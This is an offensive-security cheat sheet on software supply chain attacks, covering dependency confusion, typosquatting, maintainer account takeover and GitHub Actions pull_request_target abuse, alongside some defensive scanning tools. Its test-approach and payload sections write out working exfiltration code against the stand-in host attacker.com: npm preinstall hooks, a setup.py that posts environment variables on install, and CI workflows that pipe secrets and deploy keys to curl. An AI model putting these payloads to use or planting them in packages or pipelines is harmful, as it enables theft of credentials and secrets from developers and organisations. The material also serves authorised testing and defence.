# Supply Chain Attack Techniques

> Supply chain attacks — compromising software at the dependency, build, or distribution layer rather than the target application directly.

## Surface

- npm, PyPI, RubyGems, Maven, NuGet packages — typosquat, dependency confusion, account hijack
- CI/CD systems — GitHub Actions, Jenkins, CircleCI — malicious workflow injection
- Developer tools and IDE extensions — VSCode extensions, Burp plugins, browser dev tools
- Build artifacts — Docker base images, APT/brew packages
- Transitive dependencies — deeply nested package trees rarely audited
- Dependency confusion — internal package names resolvable from public registries
- Code signing — stolen or misused signing certificates for legitimate-looking artifacts

## Test Approach

1. **Dependency confusion** — if target uses private package registry, register same name in public registry at higher version:
   ```
   # Check target's package.json/requirements.txt for internal package names
   # Register: attacker publishes `@company/internal-auth` on public npm at v99.0.0
   # npm prefers public registry unless explicitly scoped or configured
   ```

2. **Typosquatting probe** — check for common typos of high-value packages:
   ```
   # Target uses: requests, urllib3, boto3
   # Check: reqeusts, urlib3, bto3 on PyPI — register if unclaimed
   ```

3. **CI/CD pipeline audit** — pull request from attacker fork can trigger Actions on push:
   ```yaml
   # Malicious workflow in forked PR
   - name: Exfil
     run: curl -d "$(env | base64)" https://attacker.com/env
   ```
   Check for `pull_request_target` trigger on public repos — inherits secrets.

4. **Package account takeover** — check maintainer emails on npm/PyPI for abandoned domains; register domain, reset account, publish malicious version

5. **GitHub Actions exfil via `pull_request_target`**:
   ```yaml
   on:
     pull_request_target:
   jobs:
     pwn:
       steps:
         - uses: actions/checkout@v3
           with: { ref: "${{ github.event.pull_request.head.sha }}" }
         - run: cat ${{ secrets.DEPLOY_KEY }} | curl -d @- https://attacker.com
   ```

6. **Docker image audit** — check FROM base images for known-malicious or abandoned tags:
   ```
   docker history <image> --no-trunc
   # Trace all layers; check each base image hash against known-good
   ```

7. **npm audit + outdated** — look for packages with known supply chain incidents:
   ```
   npm audit --json | jq '.vulnerabilities | to_entries[] | select(.value.severity=="critical")'
   ```

## Tools

- **confused** — dependency confusion scanner: `confused -l npm package.json`
- **pip-audit** / **npm audit** — known vulnerability detection
- **scorecard** (OpenSSF) — supply chain risk score for GitHub repos: `scorecard --repo=github.com/org/repo`
- **trivy** — container image supply chain scanning: `trivy image <image>:<tag>`
- **socket.dev** — npm/PyPI supply chain analysis with behavioral detection

## Payloads / Probes

```javascript
// Dependency confusion payload — install hook in package.json
"scripts": {
  "preinstall": "curl -s https://attacker.com/$(whoami)@$(hostname)"
}
```

```python
# PyPI setup.py — executes on pip install
import os, subprocess
subprocess.run(['curl', '-d', str(os.environ), 'https://attacker.com/env'])
```

```yaml
# GitHub Actions — secrets exfil via pull_request_target
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: env | curl -d @- https://attacker.com/env
        env:
          SECRETS: ${{ toJson(secrets) }}
```

## Chain Opportunities

- **Supply chain → developer machine RCE** — malicious package runs on install/import
- **Supply chain → CI/CD RCE → production secrets** — CI builds with stolen signing key or deploy token
- **Dependency confusion → internal network access** — package installs on CI, which has internal network access
- **Compromised extension → keystroke/session capture** — IDE extension reads files, credentials, tokens
- **Compromised Docker base → container escape** — malicious layer establishes persistence or exfils secrets at runtime

## Recent Intel

- **Axios developer tool compromise** · Release pipeline hijacked, malicious artifacts signed with legitimate certificate, distributed via official channels — rapid cert rotation was the kill-switch · https://openai.com/index/axios-developer-tool-compromise
- **CVE-2025-68143/44/45** · mcp-server-git path traversal, file overwrite, path bypass — MCP tool servers are a new supply chain vector; third-party MCP providers can compromise all Claude Code sessions using them
- **GitHub Actions `pull_request_target` supply chain** · Widely exploited pattern — public repos using this trigger expose GITHUB_TOKEN and repository secrets to PR-submitting attackers; search: `grep -r "pull_request_target" .github/`
